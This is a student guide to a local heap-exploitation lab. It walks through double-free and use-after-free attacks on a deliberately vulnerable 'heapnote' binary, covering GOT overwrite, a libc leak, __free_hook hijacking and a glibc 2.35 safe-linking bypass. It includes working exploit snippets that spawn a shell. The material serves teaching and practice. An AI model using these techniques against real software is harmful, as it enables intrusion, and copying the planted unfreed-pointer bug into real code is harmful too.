# Student Guide — Heap Pwn Tutorial

This guide walks you through every challenge step by step. Set up the local
lab (no Docker) and build both targets:

```bash
cd challenges
make setup     # one-time: fetch pinned libcs -> glibc-2.27/ glibc-2.35/ sysroot-2.27/
make all       # -> heapnote (2.27) + heapnote_235 (2.35)
```

The binary for C1–C3 is `./heapnote` (glibc 2.27 — the Ubuntu 18.04 **GA**
build `2.27-3ubuntu1`, which has **no tcache key**; don't use a later 2.27
patch level or the double-free aborts). C4 uses `./heapnote_235` (glibc
`2.35-0ubuntu3.14`). Open the target in another terminal under pwndbg so
you can watch the heap change:

```bash
gdb ./heapnote
(pwndbg) break del
(pwndbg) run
```

---

## The binary

```c
typedef struct { size_t size; char *data; } note_t;
note_t *notes[16];

void win(void){ system("/bin/sh"); }              // C1 target

void add(int i, size_t sz){ notes[i]=malloc(sizeof(note_t));
                           notes[i]->size=sz;
                           notes[i]->data=malloc(sz); read data; }
void del(int i){ free(notes[i]->data); free(notes[i]); /* BUG: no NULL */ }
void edit(int i, size_t n){ read n bytes into notes[i]->data; }   // no bound
void show(int i){ write notes[i]->size bytes of notes[i]->data; }
```

**The single bug**: `del` never does `notes[i] = NULL`. So:
- `del(0); del(0)` → **double-free** the same chunk.
- `del(0); edit(0,…)` → **use-after-free write**. `del(0); show(0)` → **UAF read** (leak).

Menu: `1 add(idx,size)` `2 del(idx)` `3 edit(idx,len)` `4 show(idx)` `5 exit`.

---

## C1 — double-free → GOT overwrite → win()

**No leak needed** (binary is `-no-pie`, so `free@GOT` and `&win` are fixed).

We use data size **0x28** (→ 0x30 chunk, tcache bin 1), NOT 0x18. Why:
`add()` mallocs the `note_t` struct (0x10 → 0x20 chunk) *and* the data
buffer. If data were 0x18 → 0x20, struct and data would share the same 0x20
tcache bin, and the struct malloc would eat our poisoned chunk before the
data malloc sees it. 0x28 → 0x30 keeps data in a different bin from the
struct (0x20), so struct mallocs come from the top chunk and leave our
poisoned 0x30 list untouched.

1. `add(0, 0x28, "AAAA")` — chunk A (0x30, tcache bin 1).
2. `del(0); del(0)` — double-free. tcache list is now `A → A` (self-loop), counts=2.
3. `add(1, 0x28, p64(free@GOT))` — malloc returns A; writing `free@GOT`
   overwrites A's `fd`. List: `head=A, A→free@GOT`, counts=1.
4. `add(2, 0x28, "DUMMY")` — malloc returns A **again** (the self-loop
   drains). Now `head = free@GOT`, counts=0.
5. `add(3, 0x28, p64(&win))` — malloc returns `free@GOT`; writing `&win`
   overwrites the GOT entry.
6. `del(0)` — free `notes[0]->data` (still = A, never NULLed) through the
   hijacked `free@GOT` → `win()` → `system("/bin/sh")`.

> **Why step 6 is `del(0)`, not a fresh `add+del`?** After the 3-malloc chain
> the 0x30 tcache is left poisoned (head = the old `free@GOT` value, counts
> underflowed), so a new `malloc(0x28)` would return a bogus address and
> crash. `notes[0]->data` still points at A (del never NULLs it), so freeing
> it goes straight through `free@GOT = win` — no new allocation needed.

> **Why does step 4 return A again?** After step 3, `head` still pointed
> at A (it was set to `A->fd` *before* we returned A and edited it). The
> poisoned `fd` only takes effect on the *next* pop, in step 5.

Run it: `python3 c1_double_free/exp.py`, then `cat flag.txt`.

**pwndbg checkpoints**: `tcache` after step 2 (0x30 bin counts=2, self-loop);
`tcache` after step 3 (`A → free@GOT`); `got` after step 5 (`free → win`).

---

## C2 — unsorted bin leak → `__free_hook` → system

### A. The leak

tcache only serves chunk sizes 0x20–0x410. Bigger chunks skip tcache and
land in the **unsorted bin** on free.

1. `add(0, 0x418, "A"*8)` — 0x420 chunk (beyond tcache).
2. `add(1, 0x18, "GUARD")` — prevents chunk 0 from merging into top.
3. `del(0)` — chunk 0 → unsorted bin. Its `fd` = `main_arena + 96`.
4. `show(0)` — UAF read prints the freed chunk's `fd`.

```python
leak = u64(show(0)[:8])
main_arena = libc.symbols['__malloc_hook'] + 0x10
libc.address = leak - main_arena - 96
```

### B. Poison + hijack

5. `add(2,0x68); add(3,0x68); del(2); del(3)` — counts=2, `head=3→2`.
6. `edit(3, 8, p64(__free_hook))` — UAF: head's `fd` → `__free_hook`.
7. `add(4,0x68,"PAD")` — malloc #1 returns chunk-3.
8. `add(5,0x68, p64(system))` — malloc #2 returns `__free_hook`; write `system`.
9. `add(6,0x68,"/bin/sh\0"); del(6)` — `free("/bin/sh")` → `system("/bin/sh")`.

`__libc_free` calls `hook(ptr, caller)` (two args); `system` reads only
`rdi`, so the extra arg is harmless.

Run: `python3 c2_unsorted_leak/exp.py`.

---

## C3 — UAF-Edit poisoning → `__free_hook` (one_gadget alt)

Same goal as C2, but the poison uses a **single** UAF-Edit — no double-free,
so it generalizes to glibc 2.29+ (where the tcache key detects double-frees).

1. Leak libc exactly as in C2 (steps 1–4).
2. `add(2,0x68); add(3,0x68); del(3); del(2)` — **two distinct** chunks,
   counts=2, head=`2→3`. No double-free.
3. `edit(2, 8, p64(__free_hook))` — UAF-Edit the head's `fd`.
4. `add(4,0x68,"PAD"); add(5,0x68, p64(system))` — pop victim then `__free_hook`.
5. `add(6,0x68,"/bin/sh\0"); del(6)` → shell.

> **The count rule**: `tcache_get` needs `counts > 0`. To pop
> victim-then-target you need `counts >= 2` — hence freeing **two**
> distinct chunks (never the same one twice, to avoid double-free detection).

### one_gadget alternative

```bash
one_gadget glibc-2.27/libc-2.27.so
# e.g. 0x4f2c5 [rsp+0x40]==NULL, 0x4f322 [rsp+0x40]==NULL, 0x10a38c [rsp+0x70]==NULL
```
Flip `USE_ONE_GADGET = True` in `exp.py` and paste a **pre-tested** gadget
(the constraint depends on the menu's stack state). Trigger via `malloc`
(overwrite `__malloc_hook`, then Add) or via `free`. `system`+`"/bin/sh"`
remains the reliable default.

Run: `python3 c3_uaf_poison/exp.py`.

---

## C4 (stretch) — safe-linking bypass on glibc 2.35

Target: `./heapnote_235` (glibc 2.35). Built by `make all` (same source,
linked/patched against the pinned 2.35 libc).

### The new defense (2.32+)

tcache `fd` is obfuscated: `stored_fd = (&fd >> 12) XOR next`. To poison
`fd` → target `T`, write `(&fd >> 12) XOR T` — you need `&fd >> 12` (a
heap-page leak).

### The heap-page leak

If a chunk is the only entry in its bin, its real `next` is NULL, so
`stored_fd = &fd >> 12`. A UAF-read leaks exactly that:

```python
del(2)                 # only entry
heap_page = u64(show(2)[:8])   # == &fd >> 12
```

### Forge a protected pointer

`PROTECT_PTR(&fd, T) = (&fd >> 12) XOR T`, and `&fd >> 12` is the heap page
(same for every chunk on a page). So you only need the leaked `heap_page`,
not the low 12 bits of any chunk address:

```python
forged = heap_page ^ target      # = PROTECT_PTR(&fd, target)
edit(chunk, 8, p64(forged))
```

### Finisher: GOT overwrite → shell (yes, it pops a shell)

Hooks are gone on 2.35, so the C2/C3 one-shot finisher doesn't exist — BUT
`heapnote_235` is still `-no-pie` + partial RELRO (writable GOT), so we reuse
C1's finisher on top of the safe-linking bypass:

```python
target   = exe.got['puts']            # NOT free@GOT — see note below
win_addr = exe.symbols['win']
forged   = heap_page ^ target          # = PROTECT_PTR(&fd, puts@GOT)
edit(3, 8, p64(forged))
add(5, 0x68, b"PADDING")              # malloc #1 -> chunk-3
add(6, 0x68, p64(win_addr))           # malloc #2 -> puts@GOT; write &win
# after add(6) returns, menu() calls puts() -> win() -> system("/bin/sh")
```

> **Why `puts@GOT`, not `free@GOT`?** glibc 2.34+ `tcache_get()` writes
> `e->key = 0` at `returned_ptr + 8`, so it also zeroes the GOT slot AFTER
> the one you overwrite. `puts@GOT`'s +8 neighbour is `write@GOT` (only
> used by `show()`, never in the menu path); `free@GOT`'s +8 is `puts@GOT`,
> which `menu()` calls → crash before you trigger. After writing
> `puts@GOT = &win`, the next `menu()` `puts()` auto-triggers → `win()` →
> shell. `win()` uses `system@GOT`, untouched, so it still fires.

### Honest scope

This is a shell because `heapnote` hands us a **writable GOT**. A real 2.35
target (full RELRO, no `win()`) needs the structural finishers — FSOP /
**House of Apple** (fake an `_IO_FILE` + a vtable in the validated range),
`exit_funcs` / TLS `dtor_list` (gated by `PTR_MANGLE` → also leak the
pointer guard), `__printf_function_table` (House of Husk). That's theory in
`SLIDES.md` (the C4 / safe-linking slides).

Run: `python3 c4_safe_linking/exp.py`, then `cat flag.txt`.

---

## After the course

- Redo C1–C3 against a glibc 2.31 build, then 2.35, adapting each step.
- Work through [pwn.college Dynamic Allocator Misuse](https://pwn.college/program-security/dynamic-allocator-misuse).
- Study [how2heap](https://github.com/shellphish/how2heap) PoCs.
- Try the agentic loop — the prompt sequence is in the deck's "Live demo"
  page (SLIDES.md, Part III): drive Claude Code against `heapnote` with the
  pyghidra-lite MCP and the three prompts there.
